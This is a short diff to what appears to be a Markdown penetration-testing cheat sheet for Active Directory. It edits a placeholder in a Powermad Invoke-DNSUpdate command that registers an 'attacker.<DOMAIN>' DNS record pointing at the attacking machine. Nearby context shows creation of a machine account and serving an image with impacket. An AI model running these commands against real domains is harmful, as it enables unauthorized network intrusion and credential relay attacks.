@@ -453,7 +453,7 @@ New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '12
 - https://github.com/Kevin-Robertson/Powermad/blob/master/Invoke-DNSUpdate.ps1
 ```
 $creds = get-credential
-Invoke-DNSUpdate -DNSType A -DNSName attacker.<DOMAIN> -DNSData <IP> -Credential $creds -Realm <DOMAIN>
+Invoke-DNSUpdate -DNSType A -DNSName attacker.<DOMAIN> -DNSData <IP ATTACKING MACHINE> -Credential $creds -Realm <DOMAIN>
 ```
 
 #### Serve image with impacket
